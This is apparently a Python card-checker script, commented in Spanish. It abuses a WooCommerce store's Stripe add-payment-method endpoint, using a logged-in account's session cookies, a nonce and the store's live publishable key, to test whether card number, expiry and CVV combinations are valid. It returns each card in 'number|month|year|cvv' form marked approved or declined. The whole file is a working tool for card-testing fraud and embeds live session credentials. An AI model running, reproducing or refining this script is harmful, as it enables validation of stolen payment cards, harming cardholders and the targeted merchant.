import requests
import json

def verificar_stripe(numero, mes, ano, cvv):
    
    cookies = {
    'tk_or': '%22%22',
    'tk_r3d': '%22%22',
    'tk_lr': '%22%22',
    '_ga': 'GA1.1.1069763268.1749285258',
    'wordpress_logged_in_7a86756acf95ef092de7febc8b8b7111': 'carocev565%7C1750494895%7CWH42F746jgAbyyfUtOdMdZDyLLiy16HCtkIpsPzgW6D%7Ce1ae5f2d31ecae8b449f093029ccedad42d0875729c99afe1bba688dc3e4060f',
    'tk_ai': '%2F4l6uTZxoBcMuTqWPKIH1Ja2',
    '__stripe_mid': 'a5a31a99-d106-45ec-b001-e1fbd3b6430f798f42',
    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A194%7D',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '69ae54e7f90bfbbef89a7ef280acc72a',
    'wp_woocommerce_session_7a86756acf95ef092de7febc8b8b7111': '188%7C%7C1749698181%7C%7C1749694581%7C%7C67271a1c4008177f8f85e9ba53e2c0a7',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-06-10%2003%3A16%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fpayment-methods%2F',
    'sbjs_first_add': 'fd%3D2025-06-10%2003%3A16%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fpayment-methods%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'tk_qs': '',
    'mailpoet_page_view': '%7B%22timestamp%22%3A1749525741%7D',
    '_ga_WF9M32P54X': 'GS2.1.s1749525405$o7$g1$t1749525742$j59$l0$h0',
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fadd-payment-method%2F',
    }

    headers = {
    'authority': 'naturalecommercestore.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _ga=GA1.1.1069763268.1749285258; wordpress_logged_in_7a86756acf95ef092de7febc8b8b7111=carocev565%7C1750494895%7CWH42F746jgAbyyfUtOdMdZDyLLiy16HCtkIpsPzgW6D%7Ce1ae5f2d31ecae8b449f093029ccedad42d0875729c99afe1bba688dc3e4060f; tk_ai=%2F4l6uTZxoBcMuTqWPKIH1Ja2; __stripe_mid=a5a31a99-d106-45ec-b001-e1fbd3b6430f798f42; mailpoet_subscriber=%7B%22subscriber_id%22%3A194%7D; woocommerce_items_in_cart=1; woocommerce_cart_hash=69ae54e7f90bfbbef89a7ef280acc72a; wp_woocommerce_session_7a86756acf95ef092de7febc8b8b7111=188%7C%7C1749698181%7C%7C1749694581%7C%7C67271a1c4008177f8f85e9ba53e2c0a7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-06-10%2003%3A16%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_first_add=fd%3D2025-06-10%2003%3A16%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; tk_qs=; mailpoet_page_view=%7B%22timestamp%22%3A1749525741%7D; _ga_WF9M32P54X=GS2.1.s1749525405$o7$g1$t1749525742$j59$l0$h0; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fnaturalecommercestore.com%2Fmy-account-2%2Fadd-payment-method%2F',
    'origin': 'https://naturalecommercestore.com',
    'referer': 'https://naturalecommercestore.com/my-account-2/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
    'payment_method': 'stripe_cc',
    '_wpnonce': '9c3bbde1a5',
    }
    response = requests.post(
    'https://naturalecommercestore.com/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent',
    cookies=cookies,
    headers=headers,
    data=data,
    )

    iid = response.json()['intent']['id']
    secret = response.json()['intent']['client_secret']


    # Cookies y headers para segunda petición
    h2 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    d2 = {
    'payment_method_data[type]':'card',
    'payment_method_data[billing_details][address][postal_code]':'70445',
    'payment_method_data[card][number]':numero,
    'payment_method_data[card][cvc]':cvv,
    'payment_method_data[card][exp_month]':mes,
    'payment_method_data[card][exp_year]':ano,
    'payment_method_data[guid]':'0a144a1a-732d-4329-977e-58574ce0644ab29d8e',
    'payment_method_data[muid]':'a5a31a99-d106-45ec-b001-e1fbd3b6430f798f42',
    'payment_method_data[sid]':'aacd291a-6e12-482e-9104-596db2960516514a7f',
    'payment_method_data[payment_user_agent]':'stripe.js/0089f5e1e2; stripe-js-v3/0089f5e1e2; card-element',
    'payment_method_data[referrer]':'https://naturalecommercestore.com',
    'payment_method_data[time_on_page]':'13211',
    'expected_payment_method_type':'card',
    'use_stripe_sdk':'true',
    'key':'pk_live_51JPKjcDpJKDRiqHW77qqT9nAAK4rrPergB935WatL78iGeZXbgBacqIPOZhHG07YJZihddahMsU2iRYM7ivvGyzB002hcJ066l',
    '_stripe_account':'acct_1JPKjcDpJKDRiqHW',
    '_stripe_version':'2022-08-01',
    'client_secret': secret
    }
    r2 = requests.post(
    f'https://api.stripe.com/v1/setup_intents/{iid}/confirm',
    headers=h2,
    data=d2,
    )

    data = r2.json()

    if 'error' in data:
        dcode = data['error'].get('code', 'N/A')
        ddcode = data['error'].get('decline_code', 'N/A')
        message = data['error'].get('message', 'N/A')
        return (
            "Stripe Auth\n"
            "=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
            f"❌ {numero}|{mes}|{ano}|{cvv}\n"
            f"Code: {dcode}\n"
            f"Decline code: {ddcode}\n"
            f"Message: {message}\n"
            "=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
        )
    else:
        stats = data.get('status', 'N/A')
        return (
            "Stripe Auth\n"
            "=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
            f"✅ {numero}|{mes}|{ano}|{cvv}\n"
            f"Status: {stats}\n"
            "Message: Approved!\n"
            "=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
        )    



    
